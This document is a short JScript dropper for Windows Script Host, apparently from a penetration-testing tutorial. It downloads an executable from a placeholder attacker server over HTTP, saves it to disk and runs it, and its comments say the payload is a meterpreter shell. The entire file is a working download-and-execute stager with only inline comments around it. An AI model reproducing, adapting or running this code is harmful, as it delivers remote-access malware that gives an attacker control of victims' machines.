var url = "http://<Web Server IP>/<payload name>.exe" //URL of our server and payload
var Object = WScript.CreateObject('MSXML2.XMLHTTP'); //instantiate the MSXML2.XMLHTTP object

Object.Open('GET', url, false); //GET Request to the URL
Object.Send(); //Send the GET request

if (Object.Status == 200) //Detect if request was successful
{
    var Stream = WScript.CreateObject('ADODB.Stream'); //Create a stream object of the HTTP response

    Stream.Open(); 
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody); //Save the Response body including meterpreter payload to the stream
    Stream.Position = 0; //Instruct stream to point to the beginning

    Stream.SaveToFile("<payload name>.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("<payload name>.exe"); //Execute the payload
